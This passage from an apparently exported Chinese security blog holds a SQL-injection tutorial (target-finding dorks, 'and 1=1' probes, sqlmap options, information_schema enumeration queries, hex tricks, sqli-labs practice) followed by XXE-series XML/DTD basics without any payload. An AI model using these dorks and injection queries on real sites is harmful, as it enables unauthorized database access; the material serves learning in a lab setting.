<p>成功<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719153932929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在1这里插入图片描述"></p>
<ol start="2">
<li>注入的常用的函数</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select system_user();      系统用户名 </span><br><span class="line">select  user(); 　　当前数据库用户名</span><br><span class="line">select  current_user(); 　　当前用户名</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select  database();  返回当前使用的数据库</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200623084124884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select	version() mysql; 　　数据库版本</span><br><span class="line">select @@datadir;     数据库路径</span><br><span class="line">select @@basedir;  数据库安装路径</span><br><span class="line">select @@global.version_compile_os;  操作系统的信息</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>寻找注入点<br>无特定目标 </li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:php?id&#x3D;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200623090208938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有特定目标</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:php?id&#x3D;site:xxxx.com</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200623090405991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="检查注入点"><a href="#检查注入点" class="headerlink" title="检查注入点"></a>检查注入点</h2><ol>
<li>手工简单识别</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">and 1=1/ and 1=2</span><br><span class="line">and&quot;1=1/and&quot;1=2</span><br><span class="line">and 1 like 1/and 1 like 2</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>工具识别</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -m   要指定的文件     多个目标URL保持到文件里-m就会用文件里的</span><br><span class="line">sqlmap --craw    sqlmap对目标网站进行爬取然后依次进行测试</span><br></pre></td></tr></table></figure>

<h2 id="mysql手动注入"><a href="#mysql手动注入" class="headerlink" title="mysql手动注入"></a>mysql手动注入</h2><ol>
<li>mysql结构<br>mysql内库<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719142556272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>核心原理:<br>MySq内置的 Information schema库,它功能强大,是我们进行MySq注入的基石!<br>通过 information schema我们可以窥透整个 MySQL的运行情况,也可以查看到数据库中所有的数据信息。</li>
</ol>
<ol start="3">
<li>查询数据库核心语法</li>
</ol>
<table>
<thead>
<tr>
<th align="center">功能名称</th>
<th align="right">查询语句</th>
</tr>
</thead>
<tbody><tr>
<td align="center">查库</td>
<td align="right">select schema_name from information_schema.schemata</td>
</tr>
<tr>
<td align="center">查表</td>
<td align="right">select table_name from information_schema.tables where table_schema=’库名’</td>
</tr>
<tr>
<td align="center">查列</td>
<td align="right">select column_name from information_schema.columns where table_name=’列名’;</td>
</tr>
<tr>
<td align="center">查数据</td>
<td align="right">select 列名 from 库名.表名</td>
</tr>
</tbody></table>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p><strong>1.查库</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719150848459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2.查表</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719154201445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3.查列</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719154345793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以不输入单引号<br>比如<code>&#39;users&#39;</code>列名转换成哈希<code>7573657273</code><br>步骤<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719155359180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719155412516.png" alt="在这里插入图片描述"><br>然后在语句里面输入<code>0x和上面生成出来的哈希</code><br>意思<br>0x是告诉我是16进行的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719155656713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ol start="4">
<li>提示</li>
</ol>
<p><strong>提示1</strong>:<br>所有类型的sql注入，都是基于査库、表、列语句     </p>
<p><strong>提示2</strong>:<br>sql注入，都是基于査库、表、列语句<br>査询的场緊：可利用limit限定返回的数置及位置，依次査询<br>回显数据的场聚：<em>concat</em>链接多个数据成为一条返回结果<br>咧</p>
<ol>
<li>limit函数<br>上面的这个limit，下面是他的演示，就是叫修改就可以查看其他的行<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020071917081938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>group_concat()函数<br>他可以叫多个列组合到一个里面，应为sql注入，可能输出的有限制，<br>找个函数就是，叫内容都输出的一个里面<br>咧</li>
</ol>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719174303407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>提示3:</strong>.<br>在一些场景，想要快速获取数据，需要接住工具，如：burp</p>
<h2 id="靶场是sqli-labs进行手动sql注入1-4到这个地方：Sqli-labs-Less1-4关卡"><a href="#靶场是sqli-labs进行手动sql注入1-4到这个地方：Sqli-labs-Less1-4关卡" class="headerlink" title="靶场是sqli-labs进行手动sql注入1-4到这个地方：Sqli-labs Less1-4关卡"></a>靶场是sqli-labs进行手动sql注入1-4到这个地方：<a href="https://blog.csdn.net/qq_41860876/article/details/107405426">Sqli-labs Less1-4关卡</a></h2>]]></content>
      <categories>
        <category>web安全</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>1.XXE漏洞原理和实战之xml的学习1</title>
    <url>/2020/10/14/1.XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="XML学习和事例"><a href="#XML学习和事例" class="headerlink" title="XML学习和事例"></a>XML学习和事例</h2><p>XML可以说是一个小型的数据库<br>他的所以的标签都是自己定义的</p>
<h3 id="什么是元素"><a href="#什么是元素" class="headerlink" title="什么是元素"></a>什么是元素</h3><p>什么是元素看一下 下面的代码<br>元素有开始标签，元素内容和结束标签组成<br>看一下面的代码<br><code>&lt;note&gt;</code>是开始标签</p>
<p>`<to>Tove</to><br><from>Jani</from><br><heading>Reminder</heading></p>
<body>Don't forget me this weekend!</body>`是元素内容
</note>是结束标签

<p>完整代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h3><p>标签对大小写敏感<br>必须正确嵌套<br>代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>代码介绍</strong><br>这个是和html的<code>&lt;!DOCTYPE html&gt;</code>差不多</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>下面这个是根元素</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">.....</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
<p><strong>下面这4个都是子元素</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="DTD学习和事例"><a href="#DTD学习和事例" class="headerlink" title="DTD学习和事例"></a>DTD学习和事例</h2><p>他有两种声明方式，内部和外部</p>
<h3 id="XML的内部DTD声明"><a href="#XML的内部DTD声明" class="headerlink" title="XML的内部DTD声明"></a>XML的内部DTD声明</h3><h4 id="声明格式"><a href="#声明格式" class="headerlink" title="声明格式"></a>声明格式</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure>
<p>!DOCTYPE 用来声明限制根元素的<br>!ELEMENT 用来声明限制元素的</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [!ELEMENT 内部元素]&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="事例和-ELEMENT的限制"><a href="#事例和-ELEMENT的限制" class="headerlink" title="事例和!ELEMENT的限制"></a>事例和!ELEMENT的限制</h4><p>!ELEMENT 用来声明限制元素的</p>
<h5 id="声明只能出现一次的子元素"><a href="#声明只能出现一次的子元素" class="headerlink" title="声明只能出现一次的子元素"></a>声明只能出现一次的子元素</h5><p>正确代码：<br>下面的代码介绍<br>第二行!DOCTYPE 声明名字是<code>note</code>的根元素<br>第三行!ELEMENT 限制<code>note</code>根元素必须有一个<code>to</code>的子元素<br>第三行!ELEMENT 有限制了<code>to</code>的子元素限制成<code>#PCDATA</code>的类型<br><code>#PCDATA</code>的类型介绍在下面</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>aaaaa<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>错误的代码：<br>错误介绍<br>其他的解释上面都说了<br>报错的原因是<br>在第三行 !ELEMENT  设置了<code>note</code>根元素就只限制了一个子元素<code>to</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>aaaaa<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>bbbbb<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201014104109.png"></p>
<h5 id="声明最少出现一次子元素用’-’"><a href="#声明最少出现一次子元素用’-’" class="headerlink" title="声明最少出现一次子元素用’+’"></a>声明最少出现一次子元素用’+’</h5><p>上面的只能出现一次的子元素声明了两个<code>to</code>就报错了<br>我们加上<code>+</code>可以就可以解决这个问题了，但是必须有一个<code>to</code>子元素<br>下面的代码介绍：<br>其他代码就不说了<br>主要在第三行加了一个<code>+</code> 意思就是!ELEMENT  限制 根元素<code>note</code>必须有一个或者多个<code>to</code>的子元素</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>+)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>aaaaa<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>bbbbb<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="零次或多次的元素用’-’"><a href="#零次或多次的元素用’-’" class="headerlink" title="零次或多次的元素用’*’"></a>零次或多次的元素用’*’</h5><p>下面代码的意思<br>!DOCTYPE 声明根元素是<code>note</code><br>主要在第三行加<code>*</code>他限制零次或多次的元素 意思就是!ELEMENT 限制<code>note</code>根元素的子元素<code>to*</code>出现几次都可以<br>!ELEMENT </p>
<p>代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>*)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>aaaaa<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>bbbbb<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>ccccc<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>他声明多个<code>to</code>子元素没有报错<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201014111546.png"></p>
<h5 id="声明出现零次或一次的元素用’-’"><a href="#声明出现零次或一次的元素用’-’" class="headerlink" title="声明出现零次或一次的元素用’?’"></a>声明出现零次或一次的元素用’?’</h5><p>下面代码的意思<br>!DOCTYPE 声明根元素是<code>note</code><br>主要在第三行加<code>?</code> 意思就是!ELEMENT 限制了<code>note</code>根元素的子元素<code>to?</code>只能出现零次或一次<code>to</code>的元素<br>!ELEMENT<br>代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>?)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>没有声明<code>to</code>元素他没有报错<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201014111701.png"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>*)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="属性声明语法"><a href="#属性声明语法" class="headerlink" title="属性声明语法"></a>属性声明语法</h4><h5 id="什么是属性"><a href="#什么是属性" class="headerlink" title="什么是属性"></a>什么是属性</h5><p>看一下，下面的html代码<br><code>src</code> 就是属性<br><code>a.png</code>就是属性的值<br><strong>XML属性值必须用” “</strong> </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;a.png&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="属性声明格式"><a href="#属性声明格式" class="headerlink" title="属性声明格式"></a>属性声明格式</h5><p>属性生明用的是<code>!ATTLIST</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>下面是属性的类型</strong><br>常用的是<code>CDATA</code>,就是字符串类型</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201014113451.png"></p>
<p><strong>他的默认值</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201014113719.png"></p>
<h5 id="属性事例"><a href="#属性事例" class="headerlink" title="属性事例"></a>属性事例</h5><p>下面代码说明<br>第二行!DOCTYPE 声明名字是<code>note</code>的根元素<br>第三行!ELEMENT 限制<code>note</code>根元素必须有一个<code>to</code>的子元素<br>第三行!ELEMENT 有限制了<code>to</code>的子元素限制里面必须有<code>a</code>和<code>b</code>子元素<br>第四行!ATTLIST 被添加元素的是<code>to</code>子元素，属性名是<code>id</code>,类型是<code>CDATA</code>是字符类型的，<code>#REQUIRED</code>意思是属性值是必需的<br>第五行和第六行 都是声明<code>a</code>和<code>c</code>子元素的类型的</p>
<p>代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (a,c)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ATTLIST <span class="meta-keyword">to</span> <span class="meta-keyword">id</span> <span class="meta-keyword">CDATA</span> <span class="meta-keyword">#REQUIRED</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT a (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT c (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span>&gt;</span>a<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">c</span>&gt;</span>b<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201014115306.png"></p>
<h3 id="XML的外部DTD声明"><a href="#XML的外部DTD声明" class="headerlink" title="XML的外部DTD声明"></a>XML的外部DTD声明</h3><p>他的dtd声明在XML内部声明已经说了<br>外部声明用<code>SYSTEM</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="meta-keyword">SYSTEM</span> [文件地址]&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="事例"><a href="#事例" class="headerlink" title="事例"></a>事例</h4><p>下面这个是XML的内部DTD声明</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>+)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>叫上面这个改成外部声明很简单<br>例：<br>a.xml文件<br>内容</p>
